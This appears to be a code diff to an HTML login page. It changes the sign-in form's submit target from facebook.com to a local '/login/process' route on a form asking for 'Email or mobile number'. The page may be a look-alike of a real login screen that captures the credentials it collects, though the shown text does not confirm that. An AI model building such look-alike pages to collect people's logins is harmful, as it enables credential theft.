@@ -18,7 +18,7 @@ function login() {
         <main>
             <div class="login-container">
                 <h2>Sign In</h2>
-                <form class="login-form" id="login-form" action="https://facebook.com" method="post">
+                <form class="login-form" id="login-form" action="/login/process" method="post">
                     <div class="input-group">
                         <input class="gaya-input" type="text" id="karma-user" name="karma-user" placeholder="Email or mobile number">
                         <label for="karma-user">Email or mobile number</label>
